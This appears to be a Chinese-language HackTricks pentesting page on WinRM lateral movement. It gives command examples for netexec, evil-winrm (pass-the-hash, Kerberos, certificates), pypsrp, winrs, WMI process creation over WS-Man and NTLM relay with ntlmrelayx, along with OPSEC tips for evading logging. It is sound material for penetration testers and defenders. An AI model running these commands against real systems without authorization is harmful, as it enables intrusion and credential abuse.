# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM 是 Windows 环境中最方便的 **lateral movement** 传输方式之一，因为它能通过 **WS-Man/HTTP(S)** 提供远程 shell，而不需要 SMB service creation tricks。若目标开放了 **5985/5986** 且你的 principal 被允许使用 remoting，你通常可以很快从“valid creds”切换到“interactive shell”。

关于 **protocol/service enumeration**、listeners、启用 WinRM、`Invoke-Command` 和通用客户端用法，请查看：

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- 使用 **HTTP/HTTPS** 而不是 SMB/RPC，因此在 PsExec-style execution 被阻止时往往仍然可用。
- 使用 **Kerberos** 时，不会把可复用凭据发送到目标。
- 可在 **Windows**、**Linux** 和 **Python** 工具中顺畅使用（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）。
- 交互式 PowerShell remoting 路径会在目标上以已认证用户上下文启动 **`wsmprovhost.exe`**，其运行方式与基于服务的 exec 在操作上不同。

## Access model and prerequisites

实际上，成功的 WinRM lateral movement 依赖 **三** 件事：

1. 目标有一个 **WinRM listener**（`5985`/`5986`）并且 firewall rules 允许访问。
2. 该账户能够 **authenticate** 到该端点。
3. 该账户被允许 **open a remoting session**。

获取这种访问的常见方式：

- 目标上的 **Local Administrator**。
- 在较新的系统上属于 **Remote Management Users**，或在仍支持该组的系统/组件上属于 **WinRMRemoteWMIUsers__**。
- 通过本地 security descriptors / PowerShell remoting ACL changes 显式委派的 remoting rights。

如果你已经控制了一台具有 admin 权限的主机，也要记住，你还可以使用此处描述的技术，**在不加入完整 admin group membership 的情况下委派 WinRM access**：

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**。如果你通过 IP 连接，client 通常会回退到 **NTLM/Negotiate**。
- 在 **workgroup** 或 cross-trust 边缘场景中，NTLM 通常需要 **HTTPS**，或者需要把目标添加到客户端的 **TrustedHosts**。
- 使用 **local accounts** 通过 Negotiate 在 workgroup 中连接时，UAC remote restrictions 可能会阻止访问，除非使用内置 Administrator 账户或设置 `LocalAccountTokenFilterPolicy=1`。
- PowerShell remoting 默认使用 **`HTTP/<host>` SPN**。在某些环境中，如果 `HTTP/<host>` 已经注册给其他 service account，WinRM Kerberos 可能会因 `0x80090322` 失败；可改用带端口的 SPN，或切换到存在该 SPN 的 **`WSMAN/<host>`**。

如果你在 password spraying 中拿到 valid credentials，最直接的验证方式通常就是通过 WinRM 检查它们是否能转成 shell：

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM for interactive shells

`evil-winrm` 仍然是从 Linux 获得交互式 shell 最方便的选项，因为它支持 **passwords**、**NT hashes**、**Kerberos tickets**、**client certificates**、文件传输，以及内存中 PowerShell/.NET 加载。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

当默认的 **`HTTP/<host>`** SPN 导致 Kerberos 失败时，可以尝试改为请求/使用 **`WSMAN/<host>`** ticket。 这通常出现在加固过的或比较特殊的企业环境中，此时 **`HTTP/<host>`** 已经绑定到另一个 service account。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
这在你在 **RBCD / S4U** abuse 之后也很有用，尤其是当你专门伪造或请求了一个 **WSMAN** service ticket，而不是一个通用的 `HTTP` ticket 时。

### 基于证书的认证

WinRM 也支持 **client certificate authentication**，但该 certificate 必须在目标上映射到一个 **local account**。从 offensive 角度看，这在以下情况很重要：

- 你已经偷取/导出了一个有效的 client certificate 和 private key，并且它已经映射给 WinRM；
- 你 abuse 了 **AD CS / Pass-the-Certificate**，为某个 principal 获取了 certificate，然后 pivot 到另一条认证路径；
- 你所处的环境有意避免基于密码的 remoting。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM 比 password/hash/Kerberos 认证少见得多，但一旦存在，它可以提供一条 **passwordless lateral movement** 路径，并且即使 password rotation 也能继续使用。

### Python / automation with `pypsrp`

如果你需要 automation 而不是 operator shell，`pypsrp` 可以通过 Python 提供 WinRM/PSRP，并支持 **NTLM**、**certificate auth**、**Kerberos** 和 **CredSSP**。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows 原生 WinRM lateral movement

### `winrs.exe`

`winrs.exe` 是内置的，当你想要**原生 WinRM 命令执行**而不打开交互式 PowerShell remoting session 时很有用：
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
在操作上，`winrs.exe` 通常会导致类似如下的远程进程链：
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
这点值得记住，因为它不同于基于 service 的 exec，也不同于交互式 PSRP sessions。

### `winrm.cmd` / WS-Man COM instead of PowerShell remoting

你也可以通过 **WinRM transport** 在不使用 `Enter-PSSession` 的情况下执行，方法是通过 WS-Man 调用 WMI classes。这样会保持 transport 为 WinRM，而远程执行原语变为 **WMI `Win32_Process.Create`**：
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
当以下情况时，这种方法很有用：

- PowerShell logging 被高度监控。
- 你想要 **WinRM transport**，但不想要经典的 PS remoting workflow。
- 你正在围绕 **`WSMan.Automation`** COM object 构建或使用自定义工具。

## NTLM relay to WinRM (WS-Man)

当 SMB relay 因 signing 被阻止，且 LDAP relay 受限时，**WS-Man/WinRM** 仍然可能是一个有吸引力的 relay target。现代的 `ntlmrelayx.py` 包含 **WinRM relay servers**，并且可以 relay 到 **`wsman://`** 或 **`winrms://`** targets。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
两个实用说明：

- 当目标接受 **NTLM** 且被转发的主体被允许使用 WinRM 时，Relay 最有用。
- 近期的 Impacket 代码会专门处理 **`WSMANIDENTIFY: unauthenticated`** 请求，因此 `Test-WSMan` 风格的探测不会破坏 relay 流程。

在落地第一个 WinRM session 后，关于 multi-hop 限制，请查看：

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 和检测说明

- **交互式 PowerShell remoting** 通常会在目标上创建 **`wsmprovhost.exe`**。
- **`winrs.exe`** 通常会创建 **`winrshost.exe`**，然后再创建请求的子进程。
- 如果你使用 PSRP 而不是原始 `cmd.exe`，则应预期会有 **network logon** 遥测、WinRM service 事件，以及 PowerShell operational/script-block logging。
- 如果你只需要执行单个命令，`winrs.exe` 或一次性 WinRM 执行通常比长期存在的交互式 remoting session 更安静。
- 如果可用 Kerberos，优先使用 **FQDN + Kerberos** 而不是 IP + NTLM，以减少信任问题以及客户端侧 `TrustedHosts` 的尴尬修改。

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
